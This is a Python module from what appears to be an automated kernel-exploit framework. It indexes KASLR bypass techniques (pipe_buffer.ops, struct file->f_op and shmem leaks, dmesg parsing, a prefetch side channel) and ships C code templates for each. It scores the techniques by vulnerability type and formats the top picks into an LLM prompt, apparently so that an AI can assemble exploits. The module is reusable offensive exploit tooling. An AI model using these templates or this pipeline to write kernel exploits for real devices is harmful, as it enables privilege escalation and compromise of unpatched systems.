"""
analysis.kaslr_oracle — KASLR bypass strategy advisor.

Every real kernel exploit needs a KASLR bypass to determine the kernel
base address at runtime.  Different vulnerability types lend themselves
to different leak vectors.  This module indexes known KASLR leak
techniques per subsystem and recommends the best approach given the
vulnerability context.

Patterns from kernel_PoCs:
  - bad_io_uring:   pipe_buffer.ops → anon_pipe_buf_ops → kernel base
  - badnode:         file->f_op → timerfd_fops → kernel base
  - badspin:         pipe_buffer.ops → anon_pipe_buf_ops → kernel base
  - CVE-2023-26083:  pipe_buffer.ops → anon_pipe_buf_ops → kernel base
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

from ..core.log import console


# ═════════════════════════════════════════════════════════════════════
# Known KASLR leak techniques
# ═════════════════════════════════════════════════════════════════════

_KASLR_TECHNIQUES: Dict[str, Dict[str, Any]] = {
    "pipe_buf_ops_leak": {
        "description": (
            "Leak pipe_buffer.ops pointer (anon_pipe_buf_ops) via UAF/OOB "
            "read on a pipe_buffer struct.  The most common technique — "
            "used by 4/6 real exploits.  After corruption, the pipe_buffer's "
            "ops field still points to the kernel .data section."
        ),
        "symbol": "anon_pipe_buf_ops",
        "how": (
            "1. Trigger UAF or OOB on a slab that can be reclaimed by pipe_buffer\n"
            "2. Read the corrupted pipe_buffer struct (e.g. via msg_msg OOB read)\n"
            "3. Extract the ops pointer (offset 0x10 in pipe_buffer)\n"
            "4. kernel_base = ops - anon_pipe_buf_ops_offset"
        ),
        "code": r"""
/* Leak kernel base via pipe_buffer.ops
 * Precondition: you have leaked a pipe_buffer struct to 'leaked_buf' */
static uint64_t kaslr_bypass_pipe_ops(uint8_t *leaked_buf) {
    uint64_t ops = *(uint64_t *)(leaked_buf + 0x10);  /* pipe_buffer.ops offset */
    if (ops == 0) {
        printf("[-] pipe_buffer.ops is NULL\n");
        return 0;
    }
    uint64_t base = ops - ANON_PIPE_BUF_OPS_OFFSET;
    printf("[+] KASLR bypass: kernel base = 0x%lx (ops=0x%lx)\n", base, ops);
    return base;
}
""",
        "slab_caches": ["kmalloc-1k", "pipe_bufs"],
        "suitable_for": ["uaf", "oob_read", "overflow", "type_confusion"],
        "reliability": "high",
        "requires": ["ability to read freed/corrupted pipe_buffer struct"],
    },

    "file_fop_leak": {
        "description": (
            "Leak struct file->f_op pointer.  Every open file descriptor "
            "has a file struct with an f_op function table pointer.  If you "
            "can read a freed struct file (e.g. via dangling fd), f_op "
            "reveals the kernel base.  Used by badnode (timerfd_fops leak)."
        ),
        "symbol": "timerfd_fops (or target-specific fops)",
        "how": (
            "1. Open a timerfd (or other known file type)\n"
            "2. Trigger UAF/corruption that lets you read the struct file\n"
            "3. f_op is at offset 0x28 in struct file (arm64 5.10)\n"
            "4. kernel_base = f_op - known_fops_offset"
        ),
        "code": r"""
/* Leak kernel base via struct file->f_op
 * Works with timerfd, eventfd, or any file with known fops symbol */
static uint64_t kaslr_bypass_file_fop(uint8_t *leaked_file) {
    uint64_t f_op = *(uint64_t *)(leaked_file + FILE_F_OP_OFFSET);
    if (f_op == 0) {
        printf("[-] file->f_op is NULL\n");
        return 0;
    }
    uint64_t base = f_op - TARGET_FOPS_OFFSET;
    printf("[+] KASLR bypass: kernel base = 0x%lx (f_op=0x%lx)\n", base, f_op);
    return base;
}
""",
        "slab_caches": ["filp", "kmalloc-256"],
        "suitable_for": ["uaf", "oob_read", "dangling_fd"],
        "reliability": "high",
        "requires": ["ability to read freed/corrupted struct file"],
    },

    "shm_file_leak": {
        "description": (
            "Leak via shmem_file_operations.  Similar to file_fop but uses "
            "shared memory file descriptors which are common in Android."
        ),
        "symbol": "shmem_file_operations",
        "how": (
            "1. Create shared memory segment\n"
            "2. Trigger corruption that lets you read the file struct\n"
            "3. kernel_base = f_op - shmem_file_operations_offset"
        ),
        "code": r"""
static uint64_t kaslr_bypass_shm(uint8_t *leaked_file) {
    uint64_t f_op = *(uint64_t *)(leaked_file + FILE_F_OP_OFFSET);
    uint64_t base = f_op - SHMEM_FILE_OPS_OFFSET;
    printf("[+] KASLR bypass (shm): kernel base = 0x%lx\n", base);
    return base;
}
""",
        "slab_caches": ["filp"],
        "suitable_for": ["uaf", "oob_read"],
        "reliability": "medium",
        "requires": ["ability to read freed/corrupted struct file"],
    },

    "dmesg_leak": {
        "description": (
            "Leak kernel pointers from dmesg when KPTR_RESTRICT is not "
            "enforced.  Only works on debug/userdebug builds or when "
            "running as root already.  Useful in CTF/lab settings."
        ),
        "symbol": "various",
        "how": (
            "1. Trigger a kernel warning/BUG that prints addresses\n"
            "2. Parse dmesg for kernel pointers (0xffff...)\n"
            "3. Calculate base from known symbol offsets"
        ),
        "code": r"""
/* Parse dmesg for kernel address leak (debug builds only) */
#include <string.h>
static uint64_t kaslr_bypass_dmesg(void) {
    FILE *fp = popen("dmesg | grep -oP '0xffff[0-9a-f]{12}' | tail -1", "r");
    if (!fp) return 0;
    char buf[64];
    if (!fgets(buf, sizeof(buf), fp)) { pclose(fp); return 0; }
    pclose(fp);
    uint64_t addr = strtoull(buf, NULL, 16);
    printf("[+] Leaked pointer from dmesg: 0x%lx\n", addr);
    return addr;  /* Caller must calculate base from known offset */
}
""",
        "slab_caches": [],
        "suitable_for": ["any"],
        "reliability": "low",
        "requires": ["KPTR_RESTRICT=0 or root access"],
    },

    "prefetch_side_channel": {
        "description": (
            "CPU prefetch side-channel for kernel base detection.  Uses "
            "timing differences of prefetch instruction at candidate "
            "addresses.  Architecture-dependent (ARM64 specific)."
        ),
        "symbol": "none (timing-based)",
        "how": (
            "1. Iterate candidate kernel base addresses (e.g. 0xffff... in 2MB steps)\n"
            "2. Use prefetch + timing to detect which addresses are mapped\n"
            "3. First mapped address reveals the kernel text base\n"
            "Note: patched in newer kernels"
        ),
        "code": "",
        "slab_caches": [],
        "suitable_for": ["any"],
        "reliability": "low",
        "requires": ["older kernel without prefetch mitigation"],
    },
}


class KASLROracle:
    """Recommend KASLR bypass strategies based on vulnerability context."""

    def recommend(
        self,
        vuln_type: str,
        *,
        slab_cache: Optional[str] = None,
        has_arb_read: bool = False,
        has_info_leak: bool = False,
        target_kernel: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Recommend KASLR bypass techniques ranked by suitability.

        Parameters
        ----------
        vuln_type:
            Vulnerability type (uaf, overflow, oob_read, type_confusion, etc.)
        slab_cache:
            The slab cache the vulnerability targets (e.g. "kmalloc-128")
        has_arb_read:
            Whether the exploit already has an arbitrary read primitive.
        has_info_leak:
            Whether there's a known information leak available.
        """
        vt = vuln_type.lower().replace("-", "_").replace(" ", "_")
        results = []

        for name, tech in _KASLR_TECHNIQUES.items():
            score = 0.0

            # Type suitability
            if vt in tech["suitable_for"] or "any" in tech["suitable_for"]:
                score += 3.0

            # Slab cache match
            if slab_cache and slab_cache in tech.get("slab_caches", []):
                score += 2.0

            # Reliability bonus
            reliability_scores = {"high": 3.0, "medium": 1.5, "low": 0.5}
            score += reliability_scores.get(tech["reliability"], 0)

            # If we already have arb_read, any technique works
            if has_arb_read:
                score += 1.0

            if score > 0:
                results.append({
                    "name": name,
                    "score": score,
                    **tech,
                })

        results.sort(key=lambda x: x["score"], reverse=True)
        return results

    def get_code(self, technique_name: str) -> str:
        """Get the C code template for a specific KASLR technique."""
        tech = _KASLR_TECHNIQUES.get(technique_name)
        return tech["code"] if tech else ""

    def list_techniques(self) -> List[str]:
        """List all available KASLR bypass technique names."""
        return list(_KASLR_TECHNIQUES.keys())

    def format_for_prompt(
        self,
        vuln_type: str = "uaf",
        slab_cache: Optional[str] = None,
    ) -> str:
        """Format KASLR bypass recommendations for LLM prompt."""
        recs = self.recommend(vuln_type, slab_cache=slab_cache)
        lines = [
            "=== KASLR Bypass Recommendations ===",
            f"For vulnerability type '{vuln_type}'"
            + (f" (slab: {slab_cache})" if slab_cache else "") + ":",
            "",
        ]
        for i, rec in enumerate(recs[:3], 1):
            lines.append(f"  {i}. {rec['name']} (score: {rec['score']:.1f})")
            lines.append(f"     {rec['description'][:120]}...")
            lines.append(f"     How: {rec['how'].split(chr(10))[0]}")
            lines.append("")
        return "\n".join(lines)
